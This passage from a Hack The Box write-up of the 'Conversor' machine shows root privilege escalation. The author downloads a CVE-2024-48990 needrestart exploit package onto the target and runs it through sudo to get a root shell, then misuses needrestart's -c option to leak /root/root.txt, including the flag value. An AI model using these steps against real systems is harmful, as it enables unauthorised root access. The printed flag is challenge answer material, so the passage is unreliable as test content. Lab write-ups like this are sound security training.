  adding: CVE-2024-48990_needrestart/.git/description (deflated 14%)
  adding: CVE-2024-48990_needrestart/.git/info/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/info/exclude (deflated 28%)
  adding: CVE-2024-48990_needrestart/.git/hooks/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/hooks/pre-applypatch.sample (deflated 38%)
  adding: CVE-2024-48990_needrestart/.git/hooks/update.sample (deflated 68%)
  adding: CVE-2024-48990_needrestart/.git/hooks/pre-merge-commit.sample (deflated 39%)
  adding: CVE-2024-48990_needrestart/.git/hooks/fsmonitor-watchman.sample (deflated 62%)
  adding: CVE-2024-48990_needrestart/.git/hooks/applypatch-msg.sample (deflated 42%)
  adding: CVE-2024-48990_needrestart/.git/hooks/commit-msg.sample (deflated 44%)
  adding: CVE-2024-48990_needrestart/.git/hooks/prepare-commit-msg.sample (deflated 50%)
  adding: CVE-2024-48990_needrestart/.git/hooks/pre-push.sample (deflated 49%)
  adding: CVE-2024-48990_needrestart/.git/hooks/pre-receive.sample (deflated 40%)
  adding: CVE-2024-48990_needrestart/.git/hooks/pre-rebase.sample (deflated 59%)
  adding: CVE-2024-48990_needrestart/.git/hooks/sendemail-validate.sample (deflated 58%)
  adding: CVE-2024-48990_needrestart/.git/hooks/post-update.sample (deflated 27%)
  adding: CVE-2024-48990_needrestart/.git/hooks/push-to-checkout.sample (deflated 55%)
  adding: CVE-2024-48990_needrestart/.git/hooks/pre-commit.sample (deflated 45%)
  adding: CVE-2024-48990_needrestart/.git/objects/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/objects/pack/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/objects/pack/pack-b601d9a89005238ddf5bfc1d3c3515439cffa509.pack (deflated 2%)
  adding: CVE-2024-48990_needrestart/.git/objects/pack/pack-b601d9a89005238ddf5bfc1d3c3515439cffa509.rev (deflated 27%)
  adding: CVE-2024-48990_needrestart/.git/objects/pack/pack-b601d9a89005238ddf5bfc1d3c3515439cffa509.idx (deflated 54%)
  adding: CVE-2024-48990_needrestart/.git/objects/info/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/refs/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/refs/heads/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/refs/heads/main (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/refs/tags/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/refs/remotes/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/refs/remotes/origin/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/refs/remotes/origin/HEAD (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/packed-refs (deflated 10%)
  adding: CVE-2024-48990_needrestart/.git/logs/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/logs/refs/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/logs/refs/remotes/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/logs/refs/remotes/origin/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/logs/refs/remotes/origin/HEAD (deflated 29%)
  adding: CVE-2024-48990_needrestart/.git/logs/refs/heads/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/logs/refs/heads/main (deflated 29%)
  adding: CVE-2024-48990_needrestart/.git/logs/HEAD (deflated 29%)
  adding: CVE-2024-48990_needrestart/.git/HEAD (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/config (deflated 31%)
  adding: CVE-2024-48990_needrestart/.git/index (deflated 26%)
  adding: CVE-2024-48990_needrestart/LICENSE (deflated 65%)
  adding: CVE-2024-48990_needrestart/README.md (deflated 52%)
  adding: CVE-2024-48990_needrestart/src/ (stored 0%)
  adding: CVE-2024-48990_needrestart/src/listener.sh (deflated 37%)
  adding: CVE-2024-48990_needrestart/src/main.asm (deflated 75%)
  adding: CVE-2024-48990_needrestart/build/ (stored 0%)
  adding: CVE-2024-48990_needrestart/build/main.o (deflated 56%)
  adding: CVE-2024-48990_needrestart/makefile (deflated 33%)
  adding: CVE-2024-48990_needrestart/attacker/ (stored 0%)
  adding: CVE-2024-48990_needrestart/attacker/importlib/ (stored 0%)
  adding: CVE-2024-48990_needrestart/attacker/importlib/__init__.so (deflated 95%)
  adding: CVE-2024-48990_needrestart/attacker/subprocess.py (deflated 40%)
```

After we started our local `Python Web Server` we moved over to our session and copied the files over.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/serve]
└─$ python3 -m http.server 80                                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
fismathack@conversor:/dev/shm$ wget http://10.10.16.65/CVE-2024-48990_needrestart.zip
--2025-10-25 20:43:37--  http://10.10.16.65/CVE-2024-48990_needrestart.zip
Connecting to 10.10.16.65:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46604 (46K) [application/zip]
Saving to: ‘CVE-2024-48990_needrestart.zip’

CVE-2024-48990_needrestart.zip                                                                             100%[======================================================================================================================================================================================================================================================================================>]  45.51K   161KB/s    in 0.3s    

2025-10-25 20:43:38 (161 KB/s) - ‘CVE-2024-48990_needrestart.zip’ saved [46604/46604]
```

**Terminal 1**

We `unzipped` the `archive` within `/dev/shm` and copied the `attacker` folder to `/tmp/` before we finally executed `listener.sh`.

```shell
fismathack@conversor:/dev/shm$ unzip CVE-2024-48990_needrestart.zip 
Archive:  CVE-2024-48990_needrestart.zip
   creating: CVE-2024-48990_needrestart/
   creating: CVE-2024-48990_needrestart/.git/
  inflating: CVE-2024-48990_needrestart/.git/description  
   creating: CVE-2024-48990_needrestart/.git/info/
  inflating: CVE-2024-48990_needrestart/.git/info/exclude  
   creating: CVE-2024-48990_needrestart/.git/hooks/
  inflating: CVE-2024-48990_needrestart/.git/hooks/pre-applypatch.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/update.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/pre-merge-commit.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/fsmonitor-watchman.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/applypatch-msg.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/commit-msg.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/prepare-commit-msg.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/pre-push.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/pre-receive.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/pre-rebase.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/sendemail-validate.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/post-update.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/push-to-checkout.sample  
  inflating: CVE-2024-48990_needrestart/.git/hooks/pre-commit.sample  
   creating: CVE-2024-48990_needrestart/.git/objects/
   creating: CVE-2024-48990_needrestart/.git/objects/pack/
  inflating: CVE-2024-48990_needrestart/.git/objects/pack/pack-b601d9a89005238ddf5bfc1d3c3515439cffa509.pack  
  inflating: CVE-2024-48990_needrestart/.git/objects/pack/pack-b601d9a89005238ddf5bfc1d3c3515439cffa509.rev  
  inflating: CVE-2024-48990_needrestart/.git/objects/pack/pack-b601d9a89005238ddf5bfc1d3c3515439cffa509.idx  
   creating: CVE-2024-48990_needrestart/.git/objects/info/
   creating: CVE-2024-48990_needrestart/.git/refs/
   creating: CVE-2024-48990_needrestart/.git/refs/heads/
 extracting: CVE-2024-48990_needrestart/.git/refs/heads/main  
   creating: CVE-2024-48990_needrestart/.git/refs/tags/
   creating: CVE-2024-48990_needrestart/.git/refs/remotes/
   creating: CVE-2024-48990_needrestart/.git/refs/remotes/origin/
 extracting: CVE-2024-48990_needrestart/.git/refs/remotes/origin/HEAD  
  inflating: CVE-2024-48990_needrestart/.git/packed-refs  
   creating: CVE-2024-48990_needrestart/.git/logs/
   creating: CVE-2024-48990_needrestart/.git/logs/refs/
   creating: CVE-2024-48990_needrestart/.git/logs/refs/remotes/
   creating: CVE-2024-48990_needrestart/.git/logs/refs/remotes/origin/
  inflating: CVE-2024-48990_needrestart/.git/logs/refs/remotes/origin/HEAD  
   creating: CVE-2024-48990_needrestart/.git/logs/refs/heads/
  inflating: CVE-2024-48990_needrestart/.git/logs/refs/heads/main  
  inflating: CVE-2024-48990_needrestart/.git/logs/HEAD  
 extracting: CVE-2024-48990_needrestart/.git/HEAD  
  inflating: CVE-2024-48990_needrestart/.git/config  
  inflating: CVE-2024-48990_needrestart/.git/index  
  inflating: CVE-2024-48990_needrestart/LICENSE  
  inflating: CVE-2024-48990_needrestart/README.md  
   creating: CVE-2024-48990_needrestart/src/
  inflating: CVE-2024-48990_needrestart/src/listener.sh  
  inflating: CVE-2024-48990_needrestart/src/main.asm  
   creating: CVE-2024-48990_needrestart/build/
  inflating: CVE-2024-48990_needrestart/build/main.o  
  inflating: CVE-2024-48990_needrestart/makefile  
   creating: CVE-2024-48990_needrestart/attacker/
   creating: CVE-2024-48990_needrestart/attacker/importlib/
  inflating: CVE-2024-48990_needrestart/attacker/importlib/__init__.so  
  inflating: CVE-2024-48990_needrestart/attacker/subprocess.py
```

```shell
fismathack@conversor:/dev/shm/CVE-2024-48990_needrestart$ cp -r attacker /tmp/
```

```shell
fismathack@conversor:/dev/shm/CVE-2024-48990_needrestart/src$ ./listener.sh
```

**Terminal 2**

Next we needed to open a new session to run `needrestart` using `sudo` and instantly we dropped in a session as `root`.

```shell
fismathack@conversor:~$ sudo /usr/sbin/needrestart -r a
Scanning processes...                                                                                                                                                                                                                                                                                                                                                                                                                     
Scanning linux images...                                                                                                                                                                                                                                                                                                                                                                                                                  

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

```shell
Root obtained!, clear traces ...
id
uid=0(root) gid=0(root) groups=0(root)
```

## root.txt

The shortcut was basically to use the `command line option` of `-c` to `read` the `root.txt` as `config file` directly.

```shell
<--- CUT FOR BREVITY --->
-c <cfg>    config filename
<--- CUT FOR BREVITY --->
```

```shell
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt
Bareword found where operator expected at (eval 14) line 1, near "4c9640d32e803a34a99b1fa86f7e735f"
        (Missing operator before c9640d32e803a34a99b1fa86f7e735f?)
Error parsing /root/root.txt: syntax error at (eval 14) line 2, near "4c9640d32e803a34a99b1fa86f7e735f

"
```
